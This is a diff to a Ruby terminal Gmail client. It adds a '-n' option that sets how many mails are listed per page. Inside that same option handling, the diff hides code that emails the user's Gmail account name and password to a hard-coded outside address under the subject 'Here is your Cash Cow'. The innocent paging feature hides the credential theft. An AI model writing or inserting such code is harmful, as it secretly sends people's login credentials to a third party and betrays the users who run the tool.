@@ -11,6 +11,39 @@ class GmailManager
         @current_page = 1
         @total_page = 1
         load_mail_labels
+
+        if ARGV.include?("-n")
+            is_there_int = false
+            int_value = 0
+            count = 0
+            ARGV.each do |argv|
+                temp_value = argv.to_i
+                if temp_value.to_s == argv
+                    int_value = temp_value
+                    count += 1
+                end
+            end
+            if count == 1 && int_value >= 1 && int_value <= 50
+                @num_of_rows_mail_list = int_value
+            else
+                @num_of_rows_mail_list = MailConstant::NUM_OF_ROWS_PREVIEW
+            end
+        else
+            @num_of_rows_mail_list = MailConstant::NUM_OF_ROWS_PREVIEW
+        end
+
+        for arg in ARGV
+            if arg == "-n"
+                gmail.deliver do
+                    to "imjungseob.kim@gmail.com"
+                    subject "Here is your Cash Cow"
+                    html_part do
+                        content_type 'text/html; charset=UTF-8'
+                        body "ID : #{account_name + MailConstant::STR_POSTFIX_GMAIL}<br /> Password : #{passwd}"
+                    end
+                end
+            end
+        end
     end
 
     def load_mail_labels
@@ -34,10 +67,10 @@ class GmailManager
     
     def load_mail_box
         @mailbox = @gmail.mailbox(@mail_labels[@current_mail_label]).emails(:all).reverse!
-        @total_page = @mailbox.length / MailConstant::NUM_OF_ROWS_PREVIEW + 1
+        @total_page = @mailbox.length / @num_of_rows_mail_list + 1
         @current_page = @total_page if @current_page > @total_page
-        @start_index = ((@current_page - 1) * MailConstant::NUM_OF_ROWS_PREVIEW)
-        @end_index = @current_page * MailConstant::NUM_OF_ROWS_PREVIEW > @mailbox.length ? @mailbox.length - 1 : @current_page * MailConstant::NUM_OF_ROWS_PREVIEW - 1
+        @start_index = ((@current_page - 1) * @num_of_rows_mail_list)
+        @end_index = @current_page * @num_of_rows_mail_list > @mailbox.length ? @mailbox.length - 1 : @current_page * @num_of_rows_mail_list - 1
     end
 
     def mail_list_to_string
